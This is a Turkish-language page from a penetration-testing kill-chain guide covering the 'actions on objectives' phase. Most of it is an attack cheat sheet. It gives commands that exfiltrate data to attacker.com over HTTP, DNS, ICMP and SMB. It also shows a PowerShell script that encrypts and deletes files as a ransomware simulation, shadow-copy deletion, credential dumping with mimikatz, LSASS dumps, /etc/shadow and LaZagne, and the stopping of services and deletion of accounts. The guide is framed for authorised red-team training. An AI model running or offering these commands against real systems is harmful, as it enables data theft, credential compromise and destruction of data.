# 🎯 Faz 7: Hedef Eylemler (Actions on Objectives)

[🇬🇧 English](../07-Actions-Objectives.md) • [🇮🇹 Versione Italiana](07-Actions-Objectives.it.md)

```
   █████╗  ██████╗████████╗██╗ ██████╗ ███╗   ██╗███████╗     ██████╗ ███╗   ██╗
  ██╔══██╗██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝    ██╔═══██╗████╗  ██║
  ███████║██║        ██║   ██║██║   ██║██╔██╗ ██║███████╗    ██║   ██║██╔██╗ ██║
  ██╔══██║██║        ██║   ██║██║   ██║██║╚██╗██║╚════██║    ██║   ██║██║╚██╗██║
  ██║  ██║╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║███████║    ╚██████╔╝██║ ╚████║
  ╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝     ╚═════╝ ╚═╝  ╚═══╝
         ██████╗ ██████╗      ██╗███████╗ ██████╗████████╗██╗██╗   ██╗███████╗███████╗
        ██╔═══██╗██╔══██╗     ██║██╔════╝██╔════╝╚══██╔══╝██║██║   ██║██╔════╝██╔════╝
        ██║   ██║██████╔╝     ██║█████╗  ██║        ██║   ██║██║   ██║█████╗  ███████╗
        ██║   ██║██╔══██╗██   ██║██╔══╝  ██║        ██║   ██║╚██╗ ██╔╝██╔══╝  ╚════██║
        ╚██████╔╝██████╔╝╚█████╔╝███████╗╚██████╗   ██║   ██║ ╚████╔╝ ███████╗███████║
         ╚═════╝ ╚═════╝  ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═══╝  ╚══════╝╚══════╝
```

**Hedef:** Sızma testinin nihai amacına ulaşmak; hassas veri tespiti ve sızdırma (exfiltration), iş etkisi yaratma veya fidye simülasyonu.

---

## 📤 Veri Sızdırma (Data Exfiltration)

### Hassas Verileri Arama

#### Windows Ortamında
```cmd
# Hassas anahtar kelimelere göre dosya arama
dir /s /b *password* *credential* *secret* *.kdbx *.key
dir /s /b *.doc* *.xls* *.pdf *.txt *.config

# Yakın tarihte değiştirilmiş dosyaları bulma
forfiles /P C:\ /S /D +01/01/2024 /C "cmd /c echo @path"

# PowerShell ile içerik bazlı parola araması
Get-ChildItem -Recurse | Select-String -Pattern "password" -List | Select Path
Get-ChildItem -Path C:\ -Include *.txt,*.doc*,*.xls* -Recurse -ErrorAction SilentlyContinue
```

#### Linux Ortamında
```bash
# Anahtar dosya ve uzantıları arama
find / -name "*password*" -o -name "*.key" -o -name "*.pem" 2>/dev/null
find / -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -l "password"

# Son 7 günde değiştirilmiş dosyalar
find / -mtime -7 -type f 2>/dev/null

# 100MB'dan büyük dosyaları bulma
find / -size +100M -type f 2>/dev/null
```

### Veriyi Sıkıştırma ve Hazırlama (Staging)

#### Windows
```powershell
# PowerShell ile ZIP arşivi oluşturma
Compress-Archive -Path C:\Sensitive -DestinationPath C:\temp\data.zip

# 7-Zip ile parolalı arşiv
7z a -p"GucluParola123!" data.7z C:\Sensitive\*

# Tar ile sıkıştırma
tar -cvzf data.tar.gz C:\Sensitive\
```

#### Linux
```bash
# Tar.gz arşivi oluşturma
tar -cvzf /tmp/data.tar.gz /home/user/sensitive/

# AES-256 ile şifreli arşiv oluşturma
tar -cvzf - /sensitive | openssl enc -aes-256-cbc -e > data.tar.gz.enc

# Parolalı ZIP
zip -r -e data.zip /sensitive/
```

### Dışa Aktarma Yöntemleri (Exfiltration Methods)

#### HTTP / HTTPS Üzerinden
```bash
# curl ile POST yükleme
curl -X POST -F "file=@/tmp/data.zip" http://attacker.com/upload.php

# Küçük boyutlu verilerde Base64 + HTTP GET/POST
base64 /tmp/data.zip | curl -d @- http://attacker.com/receive

# PowerShell ile dosya gönderme
$bytes = [IO.File]::ReadAllBytes("C:\temp\data.zip")
Invoke-WebRequest -Uri "http://attacker.com/upload" -Method POST -Body $bytes
```

#### DNS Tüneli ile Veri Sızdırma
```bash
# Veriyi onaltılık (hex) olarak DNS sorgularına gömme
cat /tmp/data | xxd -p | while read line; do nslookup $line.attacker.com; done

# dnscat2 kullanımı
dnscat2 attacker.com

# DNSExfiltrator kullanımı
python dnsexfiltrator.py -d attacker.com -f data.zip
```

#### ICMP (Ping) Üzerinden
```bash
# Ping veri alanına (payload) veri gömme
xxd -p -c 4 data.zip | while read line; do ping -c 1 -p $line attacker.com; done

# icmpsh kullanımı
python icmpsh_m.py ATTACKER_IP VICTIM_IP
```

#### SMB Paylaşımı ile
```bash
# Saldırganın SMB paylaşımına kopyalama
copy C:\Sensitive\data.zip \\attacker_ip\share\

# Linux smbclient ile yükleme
smbclient //attacker_ip/share -U user -c "put data.zip"
```

#### Bulut Depolama Alanlarına Sızdırma
```bash
# AWS S3
aws s3 cp data.zip s3://bucket-name/

# Azure Blob Storage
az storage blob upload --file data.zip --container-name mycontainer --name data.zip

# Google Cloud Storage (GCS)
gsutil cp data.zip gs://bucket-name/
```

---

## 💣 Yıkıcı Eylem Simülasyonları (Ransomware Testleri)

> ⚠️ **UYARI:** Bu adımlar yalnızca yetkilendirilmiş Red Team testlerinde uygulanmalıdır!

### Dosya Şifreleme Simülasyonu
```powershell
# PowerShell ile kontrollü test verisi şifreleme simülasyonu
$key = [System.Text.Encoding]::UTF8.GetBytes("0123456789ABCDEF")
$files = Get-ChildItem -Path C:\TestData -Recurse -File
foreach ($file in $files) {
    $content = Get-Content $file.FullName -Raw
    $encrypted = [System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes($content), $key, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    Set-Content "$($file.FullName).encrypted" $encrypted
    Remove-Item $file.FullName
}
```

### Gölge Kopyaları (Volume Shadow Copy) Silme Simülasyonu
```cmd
# Kurtarma mekanizmalarını devre dışı bırakma kontrolü
vssadmin delete shadows /all /quiet
wmic shadowcopy delete

# Gölge kopya alanını küçültme
vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB
```

---

## 🔐 Kimlik Bilgisi Hasadı (Credential Harvesting)

### Windows Kimlik Bilgileri
```powershell
# Mimikatz - Oturum açmış kullanıcı parolaları ve NTLM hash'leri
mimikatz# sekurlsa::logonpasswords

# SAM ve SYSTEM kovanlarını dışa aktarma
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
mimikatz# lsadump::sam /sam:SAM /system:SYSTEM

# LSASS bellek dökümü alma (Procdump)
procdump -ma lsass.exe lsass.dmp
mimikatz# sekurlsa::minidump lsass.dmp

# Pypykatz ile çevrimdışı LSASS analizi
pypykatz lsa minidump lsass.dmp
```

### Linux Kimlik Bilgileri
```bash
# Shadow dosyasındaki parola hash'leri
cat /etc/shadow

# Sistemdeki özel SSH anahtarları
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null

# Veritabanı ve komut geçmişleri
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.psql_history

# Konfigürasyon dosyalarındaki parolalar
grep -r "password" /etc/ 2>/dev/null
grep -r "password" /home/ 2>/dev/null
```

### Tarayıcı Parolaları
```bash
# Chrome veritabanı konumu:
# %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data

# Firefox veritabanı konumu:
# %APPDATA%\Mozilla\Firefox\Profiles\*.default\logins.json

# LaZagne ile tüm tarayıcılardaki kayıtlı parolaları çekme
python laZagne.py all
```

---

## 🖥️ Sistem ve Servis Etkisi (System Impact)

### Servis Kesintisi
```cmd
# Kritik servisleri durdurma
net stop "DNS Server"
net stop "Active Directory Domain Services"

# Servisleri başlangıçta devre dışı bırakma
sc config wuauserv start= disabled
```

### Hesap Manipülasyonu
```bash
# Kullanıcı parolasını değiştirme
net user administrator YeniParola123!

# Hesabı kilitleme/pasife alma
net user username /active:no

# Hesabı silme
net user username /delete
```

---

## 📊 Hızlı Başvuru Tablosu

### Veri Sızdırma Kanalları Karşılaştırması

| Kanal | Avantajları | Dezavantajları |
|-------|-------------|----------------|
| HTTP / HTTPS | Standart web trafiği, şifreli | Web Proxy ve DLP tarafından izlenebilir |
| DNS | Güvenlik duvarları genelde engellemez | Yavaş, paket boyutu kısıtlı |
| ICMP | Bazı kısıtlı ağlardan çıkabilir | Çok yavaştır |
| SMB | Hızlı ve yerel Windows protokolü | Sadece iç ağda etkilidir |
| Bulut (S3/Azure) | Meşru servis trafiği olarak görünür | API kimlik bilgisi gerektirir |

### Hedef Veri Öncelik Sıralaması

| Konum | Değer Seviyesi | İçerik |
|-------|----------------|--------|
| Domain Controller | En Yüksek | AD kullanıcı kimlik bilgileri, NTDS.dit |
| Dosya Sunucuları | Yüksek | Kurumsal dokümanlar, sözleşmeler |
| E-posta Sunucuları | Yüksek | Kurum içi yazışmalar ve yazışma ekleri |
| Veritabanı Sunucuları | Yüksek | Müşteri verileri, finansal kayıtlar |
| Geliştirici Sunucuları | Orta | Kaynak kodlar, API anahtarları, gizli sırlar |
| Kullanıcı İş İstasyonları | Orta | Yerel dokümanlar, tarayıcı parolaları |

---

## ✅ Sızma Testi Raporlama Kontrol Listesi

```markdown
- [ ] Ele geçirilen tüm sistemlerin listesi ve IP adresleri
- [ ] Elde edilen tüm kimlik bilgileri ve yetki seviyeleri
- [ ] İlk erişimden Domain Admin'e kadar saldırı yolu haritası
- [ ] İstismar edilen zafiyetlerin CVE ve detaylı teknik açıklamaları
- [ ] Tespit edilen hassas verilerin konumları ve etki analizi
- [ ] Net ve uygulanabilir güvenlik sıkılaştırma (remediation) önerileri
- [ ] Adım adım test zaman çizelgesi (Timeline)
- [ ] Yetkili erişimi kanıtlayan ekran görüntüleri
```

---

## 🔗 İlgili Kılavuzlar

- [Mimikatz](../../Mimikatz/README.md)
- [Linux Komutları](../../Linux-Commands/README.md)
- [PowerShell](../../PowerShell/README.md)

---

**Önceki Aşama:** [← 06 - Savunma Atlatma (Defense Evasion)](./06-Defense-Evasion.tr.md)  
**Genel Bakışa Dön:** [🎯 Kill Chain Genel Bakışı](./README.tr.md)

---

<p align="center">
  <b>🎯 Görev Tamamlandı!</b><br>
  <i>Unutmayın: Bu eylemleri yalnızca resmi yazılı izin kapsamında gerçekleştirin!</i>
</p>
